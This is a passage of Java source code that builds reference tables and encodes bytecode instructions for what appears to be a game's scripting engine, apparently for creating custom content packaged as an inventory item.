        plan.inventoryData = new InventoryItemDetails();
        plan.setThing(sticker);
        return plan;
    }

    /* ================================================================== *
     *  8. tables
     * ================================================================== */

    static int string(String s) {
        int i = strA.indexOf(s);
        if (i < 0) { i = strA.size(); strA.add(s); }
        return i;
    }

    static int fnRef(String name, int retType) {
        FunctionReferenceRow r = new FunctionReferenceRow();
        r.nameStringIdx = string(name);
        r.typeReferenceIdx = typeRef(retType);
        funcRefs.add(r);
        return funcRefs.size() - 1;
    }

    static int typeRef(int machineType) {
        TypeReferenceRow t = new TypeReferenceRow();
        t.fishType = BuiltinType.S32;
        t.machineType = MachineType.fromValue(machineType);
        t.dimensionCount = 0;
        t.arrayBaseMachineType = MachineType.VOID;
        typeRefs.add(t);
        return typeRefs.size() - 1;
    }

    static int fieldRef(String owner, String member) {
        string(owner);
        string(member);
        return 0;   // single FieldReferenceRow, added in buildScript()
    }

    /* ================================================================== *
     *  9. bytecode encoders (verified against the game's decoders)
     * ================================================================== */

    static final int T_VOID = 0, T_BOOL = 1, T_CHAR = 2, T_S32 = 3, T_F32 = 4, T_V4 = 5, T_M44 = 6,
            T_STRING = 7, T_RAW_PTR = 8, T_REF_PTR = 9, T_SAFE_PTR = 10, T_OBJ = 11, T_S64 = 12, T_F64 = 13;

    static final int OP_LCb = 1, OP_LCi = 3, OP_LCf = 4;
    static final int OP_ADDi = 42, OP_SUBi = 43;
    static final int OP_GET_SP_MEMBER = 149, OP_GET_RP_MEMBER = 150;
    static final int OP_SET_SP_MEMBER = 151, OP_SET_RP_MEMBER = 152;
    static final int OP_GET_SP_NATIVE_MEMBER = 187;
    static final int OP_ARG = 163, OP_CALL = 164, OP_RETURN = 165;

    /**
     * Pack one instruction: the opcode lives in the LOW byte, the payload above it.
     * This is the exact inverse of the loader's `opcode = word & 255` and of
     * Instruction.getBits() (e.g. GET_RP_MEMBER -> 0x0001000200030396).
     */
    static long word(int op, long payload) {
        return ((long) (op & 0xFF)) | ((payload & 0x00FFFFFFFFFFFFFFL) << 8);
    }

    static long lci(int dest, int value) {
        return word(OP_LCi, ((long) (value & 0xFFFFFFFFL) << 16) | (dest & 0xFFFF));
    }

    static long binary(int op, int dest, int a, int b) {
        return word(op, ((long) (b & 0xFFFF) << 32) | ((long) (a & 0xFFFF) << 16) | (dest & 0xFFFF));
    }

    static long addi(int dest, int a, int b) { return binary(OP_ADDi, dest, a, b); }
    static long subi(int dest, int a, int b) { return binary(OP_SUBi, dest, a, b); }

    static long getRpMember(int dest, int base, int memberRef, int mtype) {
        return word(OP_GET_RP_MEMBER, ((long) (memberRef & 0xFFFF) << 48) | ((long) (base & 0xFFFF) << 32)
                | ((long) (dest & 0xFFFF) << 16) | ((long) (mtype & 0xFF) << 8));
    }

    static long setRpMember(int base, int memberRef, int source, int mtype) {
        return word(OP_SET_RP_MEMBER, ((long) (memberRef & 0xFFFF) << 48) | ((long) (base & 0xFFFF) << 32)
                | ((long) (source & 0xFFFF) << 16) | ((long) (mtype & 0xFF) << 8));
    }

    static long getSpNativeMember(int dest, int base, int memberRef) {
        return word(OP_GET_SP_NATIVE_MEMBER, ((long) (memberRef & 0xFFFF) << 48) | ((long) (base & 0xFFFF) << 32)
                | ((long) (dest & 0xFFFF) << 16) | ((long) T_RAW_PTR << 8));
    }

    static long arg(int index, int source, int mtype) {
        return word(OP_ARG, ((long) (index & 0xFFFF) << 32) | ((long) (source & 0xFFFF) << 16)
                | ((long) (mtype & 0xFF) << 8));
    }

    static long call(int dest, int functionRef, int retType) {
        return word(OP_CALL, ((long) (functionRef & 0xFFFF) << 32) | ((long) (dest & 0xFFFF) << 16)
                | ((long) (retType & 0xFF) << 8));
    }

    static long ret(int source, int mtype) {
        return word(OP_RETURN, ((long) (source & 0xFFFF) << 32) | ((long) (mtype & 0xFF) << 8));
    }
}
